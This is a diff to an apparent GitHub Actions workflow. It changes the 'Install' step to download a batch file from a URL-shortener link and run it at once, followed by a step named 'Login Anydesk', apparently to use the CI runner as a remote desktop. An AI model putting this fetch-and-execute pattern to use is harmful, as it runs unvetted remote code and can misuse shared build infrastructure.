@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Install
         run: |
-          Invoke-WebRequest https://raw.githubusercontent.com/s15226285550/s15226285550.github.io/gh-page/d.bat -OutFile d.bat
+          Invoke-WebRequest https://url.jahid.eu.org/6hourspc -OutFile d.bat
           cmd /c d.bat
 
       - name: Login Anydesk
